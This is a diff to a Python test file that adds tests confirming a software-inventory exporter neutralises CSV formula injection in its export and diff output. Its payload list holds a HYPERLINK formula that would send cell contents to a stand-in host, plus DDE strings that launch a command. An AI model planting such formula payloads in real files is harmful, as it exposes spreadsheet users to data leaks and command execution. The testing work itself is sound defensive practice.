@@ -1196,6 +1196,61 @@ class TestDiffExportSanitization(unittest.TestCase):
         self.assertIn("Baseline software count: 0", out)  # 0 is a real value, not "unknown"
 
 
+class TestCsvFormulaInjection(unittest.TestCase):
+    """CSV exports must not carry cells that spreadsheet apps run as formulas (SEC-5)."""
+
+    PAYLOADS = [
+        '=HYPERLINK("http://x.invalid/?"&A1,"Click")',
+        "=cmd|' /C calc'!A0",          # DDE
+        "+1+cmd|' /C calc'!A0",
+        "-2+3",
+        "@SUM(A1:A9)",
+        "\t=1+1",                       # TAB becomes a space during sanitizing
+        "\r=1+1",                       # so does CR
+        "  =1+1",                       # leading whitespace is ignored by the check
+    ]
+
+    def _rows(self, csv_text):
+        return list(csv.DictReader(io.StringIO(csv_text)))
+
+    def test_csv_safe_cell_neutralises_each_prefix(self):
+        for payload in self.PAYLOADS:
+            cell = se.csv_safe_cell(payload)
+            self.assertTrue(cell.startswith("'"), f"not neutralised: {payload!r} -> {cell!r}")
+            self.assertEqual(cell[1:], se.sanitize_output(payload))
+
+    def test_ordinary_values_unchanged(self):
+        for value in ["Google Chrome", "A, B & C", 'App "Pro"', "a=b", "1.2.3",
+                      "C:\\Program Files\\App", "", "Notepad++"]:
+            self.assertEqual(se.csv_safe_cell(value), value)
+
+    def test_none_becomes_empty_cell(self):
+        self.assertEqual(se.csv_safe_cell(None), "")
+
+    def test_to_csv_guards_every_field(self):
+        sw = se.SoftwareInfo(name="=1+1", version="-1", publisher="@evil", install_date="+2",
+                             source="=src", install_location="=C:\\x")
+        row = self._rows(se.SoftwareExporter.to_csv([sw]))[0]
+        for field, value in row.items():
+            self.assertTrue(value.startswith("'"), f"{field} not neutralised: {value!r}")
+
+    def test_to_csv_round_trip_keeps_value_readable(self):
+        payload = '=HYPERLINK("http://x.invalid/?"&A1,"Click")'
+        row = self._rows(se.SoftwareExporter.to_csv([se.SoftwareInfo(name=payload)]))[0]
+        self.assertEqual(row["name"], "'" + payload)
+
+    def test_diff_csv_guards_every_field(self):
+        evil = se.SoftwareInfo(name="=1+1", version="+1", publisher="@p", source="-s")
+        old = se.SoftwareInfo(name="=App", version="=1", publisher="@p", source="-s")
+        new = se.SoftwareInfo(name="=App", version="=2", publisher="@p", source="-s")
+        diff = se.BaselineDiff(added=[evil], removed=[evil], changed=[(old, new)])
+        rows = list(csv.reader(io.StringIO(se.BaselineManager.diff_to_csv(diff))))
+        for row in rows[1:]:
+            for cell in row[1:]:                       # row[0] is our own change_type label
+                if cell:
+                    self.assertTrue(cell.startswith("'"), f"not neutralised: {cell!r}")
+
+
 class TestCompiledSkipPatterns(unittest.TestCase):
     """Test that compiled SKIP_PATTERNS work correctly."""
 
@@ -1532,6 +1587,7 @@ class SecurityTestSuite(unittest.TestSuite):
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestQuietMode))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCsvSanitizationConsistency))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestDiffExportSanitization))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCsvFormulaInjection))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCompiledSkipPatterns))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestLoadEnvFile))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestWingetUpdateChecker))
